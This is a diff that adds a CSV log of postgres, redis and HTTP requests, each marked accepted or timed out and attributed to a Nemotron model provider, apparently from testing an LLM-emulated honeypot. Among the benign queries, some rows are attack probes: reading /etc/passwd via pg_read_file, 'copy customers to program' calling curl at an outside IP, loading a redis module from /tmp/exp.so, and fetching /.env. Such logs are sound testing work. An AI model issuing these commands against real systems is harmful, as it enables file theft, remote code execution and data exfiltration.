@@ -1,0 +1,21 @@
+proto,request,status,reason,latency_ms,provider
+postgres,select email from customers where email ilike '%admin%' fetch first 3 rows only,accepted,,1539,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,"select c.full_name, sum(o.quantity) from customers c join orders o on o.customer_id = c.id group by 1",accepted,,887,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,select * from pg_stat_activity,accepted,,1149,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,"select usename, usesuper from pg_user",timeout,no answer within 3s,3001,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,select * from invoices,accepted,,545,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,show data_directory,accepted,,516,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,select pg_read_file('/etc/passwd'),accepted,,527,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,copy customers to program 'curl http://203.0.113.50/x',accepted,,700,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,select current_setting('server_version_num'),accepted,,856,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+postgres,"select title, price_cents from products order by price_cents desc nulls last limit 3",accepted,,782,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,CLIENT LIST,accepted,,1339,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,MEMORY STATS,accepted,,601,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,OBJECT ENCODING session:1,accepted,,431,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,CONFIG GET dir,accepted,,591,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,SCAN 0 MATCH session:* COUNT 100,accepted,,1499,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+redis,MODULE LOAD /tmp/exp.so,accepted,,956,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+http,GET /admin/login,accepted,,1034,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+http,GET /api/customers/export.csv,accepted,,1016,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+http,POST /api/orders/refund,accepted,,1018,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
+http,GET /.env,accepted,,716,nim:nvidia/nemotron-3.5-super-vl-120b-a12b
